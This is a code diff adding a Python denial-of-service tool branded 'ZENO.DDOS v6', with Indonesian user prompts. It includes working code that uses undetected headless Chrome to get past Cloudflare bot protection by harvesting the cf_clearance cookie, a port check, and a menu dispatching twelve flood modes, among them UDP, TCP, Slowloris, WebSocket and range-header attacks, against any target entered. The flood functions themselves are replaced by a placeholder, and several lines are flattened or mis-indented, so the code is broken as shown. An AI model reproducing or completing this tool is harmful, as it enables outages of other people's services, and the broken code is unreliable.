@@ -1,0 +1,73 @@
+
+
+import requests, threading, time, socket, re, os, random, json from urllib.parse import urlparse
+
+try: import undetected_chromedriver as uc from selenium.webdriver.common.by import By from websocket import create_connection except ImportError: uc = None
+
+RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'; CYAN = '\033[96m'; RESET = '\033[0m'
+
+BANNER = f"""{CYAN} ███████╗███████╗███╗   ██╗ ██████╗ ██╔════╝██╔════╝████╗  ██║██╔════╝ █████╗  █████╗  ██╔██╗ ██║██║  ███╗ ██╔══╝  ██╔══╝  ██║╚██╗██║██║   ██║ ██║     ███████╗██║ ╚████║╚██████╔╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝ ╚═════╝ {RESET}     {YELLOW}ZENO.DDOS v6 ULTRA STRIKE MODE{RESET} """
+
+def valid_url(url): pattern = r"^https?://([a-zA-Z0-9-.]+|\d{1,3}(.\d{1,3}){3})(:\d+)?(/.*)?$" return re.match(pattern, url) is not None
+
+def extract_host(url): return urlparse(url).netloc.split(":")[0]
+
+def port_open(ip, port): try: socket.create_connection((ip, port), timeout=2).close() return True except: return False
+
+def get_cf_cookie(target): if not uc: print(f"{RED}[x] Modul undetected-chromedriver tidak tersedia!{RESET}") exit() print(f"{YELLOW}[•] Meluncurkan Stealth Chrome...{RESET}") options = uc.ChromeOptions() options.add_argument("--headless=new") options.add_argument("--no-sandbox") options.add_argument("--disable-blink-features=AutomationControlled") try: driver = uc.Chrome(options=options) driver.get(target) time.sleep(6) cookies = driver.get_cookies() cf_clearance = next((c['value'] for c in cookies if c['name'] == 'cf_clearance'), None) ua = driver.execute_script("return navigator.userAgent") driver.quit() if not cf_clearance: print(f"{RED}[x] Gagal mendapatkan cf_clearance cookie.{RESET}") exit() return cf_clearance, ua except Exception as e: print(f"{RED}[x] Stealth mode error: {e}{RESET}") exit()
+
+=== ALL 12 ATTACK MODES GO HERE (HTTP, UDP, TCP, Slowloris, WS, etc) ===
+
+(Sudah didefinisikan sebelumnya, disingkat di sini karena keterbatasan ruang)
+
+=== MAIN PROGRAM ===
+
+if name == "main": os.system("clear") print(BANNER) try: target = input(f"{CYAN}[?] Masukkan target URL/IP: {RESET}").strip() if not valid_url(target): target = f"http://{target}"  # assume IP raw host = extract_host(target) ip = socket.gethostbyname(host) port = 443 if target.startswith("https") else 80
+
+if not port_open(ip, port):
+        print(f"{RED}[x] Port {port} tertutup di {ip}{RESET}")
+        exit()
+
+    duration = int(input(f"{CYAN}[?] Durasi serangan (detik): {RESET}"))
+    threads = int(input(f"{CYAN}[?] Jumlah thread: {RESET}"))
+
+    print(f"{CYAN}=== PILIH MODE ===")
+    print(" 1) HTTP GET")
+    print(" 2) HTTP POST")
+    print(" 3) HTTP HEAD")
+    print(" 4) HTTP MIX")
+    print(" 5) UDP FLOOD")
+    print(" 6) TCP FLOOD")
+    print(" 7) SLOWLORIS")
+    print(" 8) WEBSOCKET FLOOD")
+    print(" 9) GRAPHQL QUERY FLOOD")
+    print("10) CUSTOM PAYLOAD POST")
+    print("11) RANDOM HEADER BOMB")
+    print("12) RANGE HEADER ATTACK")
+
+    mode = input(f"{CYAN}[?] Pilih mode (1-12): {RESET}")
+
+    if mode == "1": attack_http(target, None, "ZenoClient/6.0", duration, threads, "get")
+    elif mode == "2": attack_http(target, None, "ZenoClient/6.0", duration, threads, "post")
+    elif mode == "3": attack_http(target, None, "ZenoClient/6.0", duration, threads, "head")
+    elif mode == "4": attack_http(target, None, "ZenoClient/6.0", duration, threads, "mix")
+    elif mode == "5": attack_udp(ip, port, duration, threads)
+    elif mode == "6": attack_tcp(ip, port, duration, threads)
+    elif mode == "7": attack_slowloris(ip, port, duration, threads)
+    elif mode == "8": attack_websocket(ip, port, duration, threads)
+    elif mode == "9": attack_graphql(target, duration, threads)
+    elif mode == "10":
+        payload_path = input(f"{CYAN}[?] Path ke file JSON payload: {RESET}")
+        attack_custom_post(target, payload_path, duration, threads)
+    elif mode == "11": attack_header_bomb(target, duration, threads)
+    elif mode == "12": attack_range_header(target, duration, threads)
+    else:
+        print(f"{RED}[x] Mode tidak valid!{RESET}")
+
+    print(f"\n{GREEN}[✓] ZENO STRIKE SELESAI 💥{RESET}")
+
+except KeyboardInterrupt:
+    print(f"\n{RED}[x] Dibatalkan user.{RESET}")
+except Exception as e:
+    print(f"{RED}[x] Error: {e}{RESET}")
+
